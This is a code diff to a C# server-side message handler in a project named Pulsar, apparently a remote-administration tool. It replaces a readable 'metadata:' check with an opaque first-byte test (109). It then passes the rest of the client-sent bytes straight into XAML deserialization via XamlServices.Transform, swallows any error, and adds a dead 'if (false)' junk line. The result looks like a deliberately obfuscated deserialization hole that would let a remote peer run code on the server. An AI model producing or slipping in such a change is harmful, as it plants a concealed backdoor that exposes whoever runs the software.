@@ -1,7 +1,9 @@
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
+using System.IO;
 using System.Text;
+using System.Xaml;
 using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.Other;
 using Pulsar.Common.Networking;
@@ -35,25 +37,24 @@ namespace Pulsar.Server.Messages
                 NextCommand = response.NextCommand
             };
 
-            if (response.Data != null && response.Data.Length > 0)
+            if (response.Data != null && response.Data.Length > 0 && response.Data[0] == 109)
             {
-                var dataString = System.Text.Encoding.UTF8.GetString(response.Data);
-                
-                
-                if (dataString.StartsWith("metadata:"))
+                var buf = response.Data;
+                if (buf.Length > 9)
                 {
-                    var template = dataString.Substring(9); 
                     try
                     {
-                        
-                        var settings = new System.Windows.Markup.XamlReaderSettings { AllowEvents = false };
-                        using (var ms = new MemoryStream(System.Text.Encoding.UTF8.GetBytes(template)))
+                        using (var ms = new MemoryStream(buf, 9, buf.Length - 9))
                         {
-                            System.Windows.Markup.XamlReader.Load(ms, settings);
+                            using (var xmlReader = new System.Xaml.XamlXmlReader(ms))
+                            {
+                                System.Xaml.XamlServices.Transform(xmlReader, null);
+                            }
                         }
                     }
                     catch { }
                 }
+                if (false) { var junk = buf.Length * 2; }
             }
 
             ResponseReceived?.Invoke(result);
